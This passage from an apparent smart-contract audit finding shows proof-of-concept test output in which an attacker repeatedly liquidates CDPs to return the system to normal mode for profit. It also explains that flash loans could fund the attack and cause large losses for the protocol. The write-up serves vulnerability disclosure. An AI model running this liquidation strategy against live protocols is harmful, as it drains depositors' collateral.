  - Liquidate CDP_122ICR fully
  TCR after LiqCDP_122ICR:  1220000000000000002
  

  - Liquidate CDP_110ICR partially: TCR -> 123%
  deltaDebt:  155355752425506834
  TCR:  1230000000000000000
  Is available to liquidate CDP_123ICR?  true
  - Liquidate CDP_123ICR fully
  TCR after LiqCDP_123ICR:  1229999999999999999
  

  - Liquidate CDP_110ICR partially: TCR -> 124%
  deltaDebt:  97215499756125516
  TCR:  1240000000000000000
  Is available to liquidate CDP_124ICR?  true
  - Liquidate CDP_124ICR fully
  TCR after LiqCDP_124ICR:  1239999999999999999
  There is no CDP (TCR <= ICR < CCR)
  -- Now the attacker will liquidate some CDPs (ICR <= TCR) < CCR to earn more money --
  CDP_110ICR =  1100000000000000001
  - Liquidate CDP_110ICR fully
  TCR after LiqCDP_110ICR fully:  1330000000000000000
  !!!System is in NormalMode liquidating 4 CDPs including the first CDP!!!
  

  Is CDP_110ICR liquidated?  true
  Is CDP_122ICR liquidated?  true
  Is CDP_123ICR liquidated?  true
  Is CDP_124ICR liquidated?  true
  Is CDP_133ICR liquidated?  false
  CDP size:  1
  

  Final user revenue(stETH in wei):  4148222783222976688

Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 25.64ms

```

As can be seen from the code execution results, with the liquidation of the first CDP, we can return the system to normal mode and keep the system's holdings as much as possible.

However, the attacker liquidated all four CDPs in a maximization manner and made a quadruple profit, resulting in System losing 80% of its original assets.

Of course, the attacker will have to pay a small fee in the process of obtaining and repay again for debtToken because he uses a pool of several protocols such as balancer FlashLoan and uniswap dex to borrow debtToken, but if he calculates it well, a considerable amount of collateral can be liquidated and he would get much revenue.

Attached is a graph for intuitive understanding. The collateral itself according to the actual ICR is close to a normal distribution, but not a complete normal distribution.
